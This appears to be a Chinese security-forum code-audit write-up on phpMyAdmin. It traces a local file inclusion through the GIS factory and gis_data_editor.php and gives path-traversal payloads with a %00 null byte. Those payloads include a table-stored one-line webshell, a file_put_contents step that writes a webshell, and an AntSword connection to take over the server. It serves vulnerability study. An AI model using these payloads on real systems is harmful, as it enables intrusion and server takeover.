代码审计
----

这里的话漏洞规则是我自己写的  
文件包含的话规则是：

```php
include.*\$.{1,5}|include_once.*\$.{1,5}|require.*\$.{1,5}|require_once.*\$.{1,5}
```

如果师傅们有什么好的规则或者想法还请评论区分享下  
&lt;hr&gt;

这里的话自动审计出来的文件包含漏洞  
还挺多的  
这里的话我是自己一个一个追踪排除寻找漏洞的  
所以可能有些地方有漏洞但是因为我知识浅薄没发现

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-370d41c212876f63acbd69034fbb63da127c164b.png)

&lt;hr&gt;

### 漏洞不存在案例

这里漏洞不存在的案例就放一个了，不然文章就得写太多了  
这里的话能看到一个 include $\_REQU

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-d925c653af2b84defb524d50006a0c052ec16db2.png)  
&lt;hr&gt;

进入查看源码  
这里需要满足四个条件才能够包含 target

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-12cd201949dc2c8d1c38b8c97d141c0f37a2c3a8.png)

- - - - - -

#### 1 !empty($\_REQUEST\['target'\])

empty()函数，判断内容中的变量是否为空  
如果为空，那么返回 True  
!是取反，也就是检测是否非空  
说白了就是看一下这里有没有传入target这个变量

- - - - - -

#### 2 is\_string($\_REQUEST\['target'\])

检测变量是否为字符串

#### 3 ! preg\_match(‘/^index/‘, $\_REQUEST\[‘target’\])

正则表达式，^符号为匹配开头，也就是说开头需要是 index，返回值才是True  
结合前面的感叹号 “!”  
布尔值取反，  
也就是说，开头不能是 index

#### 4 in\_array($\_REQUEST\[‘target’\], $goto\_whitelist)

in\_array() 判断第一个参数是否存在于第二个参数（数组）之中  
也就是说，第二个参数是一个数组  
判断这个数组里面有没有第一个参数

前三个条件都好满足  
主要是最后一个  
全文搜索变量 $goto\_whitelist  
并没有找到关于它的定义  
推测这可能是一个全局变量

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-b5bd979f0a6e1ce3aa094c6623c0ae7b9eeff8ba.png)

全局搜索

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-07badcc65e653dd18eb10ccccb6ebb3931087d9b.png)

```php
$goto_whitelist = array(
    //'browse_foreigners.php',
    //'changelog.php',
    //'chk_rel.php',
    'db_create.php',
    'db_datadict.php',
    'db_sql.php',
    'db_events.php',
    'db_export.php',
    'db_importdocsql.php',
    'db_qbe.php',
    'db_structure.php',
    'db_import.php',
    'db_operations.php',
    'db_printview.php',
    'db_search.php',
    'db_routines.php',
    'export.php',
    'import.php',
    //'index.php',
    //'navigation.php',
    //'license.php',
    'index.php',
    'pdf_pages.php',
    'pdf_schema.php',
    //'phpinfo.php',
    'querywindow.php',
    'server_binlog.php',
    'server_collations.php',
    'server_databases.php',
    'server_engines.php',
    'server_export.php',
    'server_import.php',
    'server_privileges.php',
    'server_sql.php',
    'server_status.php',
    'server_status_advisor.php',
    'server_status_monitor.php',
    'server_status_queries.php',
    'server_status_variables.php',
    'server_variables.php',
    'sql.php',
    'tbl_addfield.php',
    'tbl_change.php',
    'tbl_create.php',
    'tbl_import.php',
    'tbl_indexes.php',
    'tbl_move_copy.php',
    'tbl_printview.php',
    'tbl_sql.php',
    'tbl_export.php',
    'tbl_operations.php',
    'tbl_structure.php',
    'tbl_relation.php',
    'tbl_replace.php',
    'tbl_row_action.php',
    'tbl_select.php',
    'tbl_zoom_select.php',
    //'themes.php',
    'transformation_overview.php',
    'transformation_wrapper.php',
    'user_password.php',
);

```

点进去查看一下  
这里的内容全部被写死了  
也就是说不属于我们可以控制的范围  
这个点就pass掉了  
&lt;hr&gt;

### 漏洞点

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-fccf6a76cc72f74b2019df8bbc393c6b938170bf.png)

查看代码

```php
class PMA_GIS_Factory
{
    /**
     * Returns the singleton instance of geometric class of the given type.
     *
     * <span>@param</span> string $type type of the geometric object
     *
     * <span>@return</span> object the singleton instance of geometric class of the given type
     * <span>@access</span> public
     * <span>@static#CTL{n}</span>     */
    public static function factory($type)
    {
        include_once './libraries/gis/pma_gis_geometry.php';

        $type_lower = strtolower($type);
        if (! file_exists('./libraries/gis/pma_gis_' . $type_lower . '.php')) {
            return false;
        }
        if (include_once './libraries/gis/pma_gis_' . $type_lower . '.php') {
            switch(strtoupper($type)) {
            case 'MULTIPOLYGON' :
                return PMA_GIS_Multipolygon::singleton();
            case 'POLYGON' :
                return PMA_GIS_Polygon::singleton();
            case 'MULTIPOINT' :
                return PMA_GIS_Multipoint::singleton();
            case 'POINT' :
                return PMA_GIS_Point::singleton();
            case 'MULTILINESTRING' :
                return PMA_GIS_Multilinestring::singleton();
            case 'LINESTRING' :
                return PMA_GIS_Linestring::singleton();
            case 'GEOMETRYCOLLECTION' :
                return PMA_GIS_Geometrycollection::singleton();
            default :
                return false;
            }
        } else {
            return false;
        }
    }
}

```

追踪过去  
变量 $type\_lower 被拼接在了内容里

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-f436bffbeaf5ad5fff4e309da3b55d9cb1a23929.png)  
&lt;hr&gt;

向上追踪  
这里 $type\_lower 是将 $type 的字符转化为小写  
$type 是函数的传入参数

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-5e91f461a2a1505eaeab635ccfbb094e3db32106.png)

然后我们搜索一下这个函数在哪里被调用了  
一个一个往下找吧  
除了第二个  
因为第二个是定义这个函数

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-3bc58eccaf97e3e1c822a3098a22acb9208dcf06.png)

第一个，这里传入参数是 $geom\_type

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-c5081bd9a7be21a1439ed33dc944f965f2820bea.png)

向上追踪 $geom\_type  
这里 $geom\_type是取出数组  
$gis\_data中的 gis\_type 键所对应的值  
也就是说  
$gis\_data 是一个数组  
这个数组里面有键值对  
把 gis\_type 取出来  
变成变量 $geom\_type

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-184ccefa26d3e99766f45fdcbeac9e55bd433d58.png)

再向上追溯  
这个代码块，会给 数组 gis\_type 赋值  
如果满足了 这些 if 条件  
那么 gis\_type 就相当于被写死了

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-922a60a144a94e8cea291ea4ad7a49bb5fffbb65.png)

查看最上面的 if 条件  
! isset($gis\_data\[‘gis\_type’\])  
isset() 检测变量是否存在  
存在返回 True  
加上感叹号取反  
就是不存在返回 True  
也就是检测是否为空  
为空才会执行  
所以这里也没什么卵用  
&lt;hr&gt;

再向上追溯  
这里第一句先给 $gis\_data 建立成一个空数组  
然后用了一个函数作为布尔值的返回  
如果函数返回值为True  
那么$gis\_data的值就会变成我们所传入的  
$\_REQUEST\[‘gis\_data’\]

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-b943f6ae2124d75369b1bbcda7e18dddda4135b1.png)

追踪函数

```php
function PMA_isValid(&amp;$var, $type = 'length', $compare = null)
{
    if (! isset($var)) {
        // var is not even set
        return false;
    }
    if ($type === false) {
        // no vartype requested
        return true;
    }
    if (is_array($type)) {
        return in_array($var, $type);
    }
    // allow some aliaes of var types
    $type = strtolower($type);
    switch ($type) {
    case 'identic' :
        $type = 'identical';
        break;
    case 'len' :
        $type = 'length';
        break;
    case 'bool' :
        $type = 'boolean';
        break;
    case 'float' :
        $type = 'double';
        break;
    case 'int' :
        $type = 'integer';
        break;
    case 'null' :
        $type = 'NULL';
        break;
    }
    if ($type === 'identical') {
        return $var === $compare;
    }
    // whether we should check against given $compare
    if ($type === 'similar') {
        switch (gettype($compare)) {
        case 'string':
        case 'boolean':
            $type = 'scalar';
            break;
        case 'integer':
        case 'double':
            $type = 'numeric';
            break;
        default:
            $type = gettype($compare);
        }
    } elseif ($type === 'equal') {
        $type = gettype($compare);
    }
    // do the check
    if ($type === 'length' || $type === 'scalar') {
        $is_scalar = is_scalar($var);
        if ($is_scalar &amp;&amp; $type === 'length') {
            return (bool) strlen($var);
        }
        return $is_scalar;
    }
    if ($type === 'numeric') {
        return is_numeric($var);
    }
    if (gettype($var) === $type) {
        return true;
    }
    return false;
}
```

我们一步一步来看  
刚刚调用函数时，传入的第一个参数为  
$\_REQUEST\[‘gis\_data’\]  
第二个参数为  
‘array’  
&lt;hr&gt;

#### 先来看前三个if语句

```php
    if (! isset($var)) {
        // var is not even set
        return false;
    }
    if ($type === false) {
        // no vartype requested
        return true;
    }
    if (is_array($type)) {
        return in_array($var, $type);
    }
```

第一个检测$var是否存在  
不存在返回 false  
如果我们传入了变量 $\_REQUEST\[‘gis\_data’\]  
第一个 if 就无影响

第二个if 判断 $type 的值是否全等于 false  
但是$type的值是array  
也就过掉了

第三个if是判断$type是不是数组  
很显然不是，也过掉  
&lt;hr&gt;

#### 然后就是一个switch语句

```php
switch ($type) {
    case 'identic' :
        $type = 'identical';
        break;
    case 'len' :
        $type = 'length';
        break;
    case 'bool' :
        $type = 'boolean';
        break;
    case 'float' :
        $type = 'double';
        break;
    case 'int' :
        $type = 'integer';
        break;
    case 'null' :
        $type = 'NULL';
        break;
}
```

这里的话 case 就是匹配 $type 的值  
当 $type 的值和某一个对应上了  
就执行这个case下的语句  
很显然这里没有一个是array的  
无影响

#### 接下来的三个if还是判断 $type 的值有无对应的

但是很显然，没有对应

```php
    if ($type === 'similar') {
        switch (gettype($compare)) {
        case 'string':
        case 'boolean':
            $type = 'scalar';
            break;
        case 'integer':
        case 'double':
            $type = 'numeric';
            break;
        default:
            $type = gettype($compare);
        }
    } elseif ($type === 'equal') {
        $type = gettype($compare);
    }
    // do the check
    if ($type === 'length' || $type === 'scalar') {
        $is_scalar = is_scalar($var);
        if ($is_scalar &amp;&amp; $type === 'length') {
            return (bool) strlen($var);
        }
        return $is_scalar;
    }
    if ($type === 'numeric') {
        return is_numeric($var);
    }
```

#### 最后一个if语句

gettype() 获取参数的属性  
$type -&gt; array  
也就是说我们的$var需要是一个数组  
这里的返回值就是True了

```php
    if (gettype($var) === $type) {
        return true;
    }
```

GetShell
--------

### 表包含

创建一个表  
写入一句话木马  
（注：这里木马的密码不能是数字，也不能和其他cms里已经用过的参数冲突，不然会被判断值什么的然后重置）

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-a338ba9d9a376ee1e4c7c567ae4867414a04f3e2.png)

然后找一下sql文件的储存路径

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-56bc536d6f8975f25c0715142ae118dfb2a8d43a.png)

得到路径  
C:/phpStudy/MySQL/data/  
然后这里就有一个问题了  
linux对路径大小写铭感  
因为源码中有一条语句会将我们传入的参数  
都变成小写  
所以在linux中，如果路径里有大写字母  
就不能用了  
但是一般来说，是小写  
这也可以成为我们的一种防御思路  
敏感路径用驼峰命名法  
简单好用还能防漏洞  
&lt;hr&gt;

构造payload  
gis\_data\[gis\_type\]=/../../../../../../../../../../../../phpstudy/mysql/data/wz/abc.frm%00&amp;a=phpinfo();

wz是数据库库名  
然后拼接起来的话就是  
./libraries/gis/pma*gis*/../../../../../../../../../../../../phpstudy/mysql/data/wz/abc.frm%00.php  
因为%00  
.php会被忽略  
&lt;hr&gt;

然后访问存在漏洞的页面  
gis\_data\_editor.php  
利用hackbar  
将其他的参数删掉  
留下token  
因为会通过token值进行一些判断  
如果没有token值可能被认定为CSRF攻击（应该）  
从而被拦截

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-bddf2bf8a19b1614859cca14e67c711cf61f2961.png)

- - - - - -

发送数据包之后如果没反应  
可以把上面的url滑到最后  
查看上面的url和自己填的一样不一样  
不一样就改了

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-451344822a7847a53304d23c931c38ff5ebe1d53.png)

- - - - - -

成功代码执行

### 写入木马

然后再改造payload写入木马

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-e271745756afc4d6ee97bd53a04d83b98abd1219.png)

gis\_data\[gis\_type\]=/../../../../../../../../../../../../phpstudy/mysql/data/wz/abc.frm%00&amp;a=file\_put\_contents(‘3.php’,’’);

这里的话用system() + echo 写木马会有点问题,所以就直接用file\_put\_contents()了

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-4e14081c7dc9cfafbe91cba469b3b13510e04693.png)

- - - - - -

访问3.php

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-dae7baae5518b3e19ffa841d2cf1fb2eea4cb965.png)

连接蚁剑  
成功拿下目标web服务器

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-8fcfb8ae673436e41d3c953f68b05f0cec6662c7.png)

#### 总结

还是刚刚说的那些，这里如果是Linux服务器的话，并且sql文件储存路径有大小写的话，就没办法拿到webshell了，并且还不能任意文件包含，还只能包含路径没有大写字符的，反正至少以我目前的水平是不行的，不过 linux 默认mysql文件的路径是 /var/lib/mysql/。默认情况下是无影响的。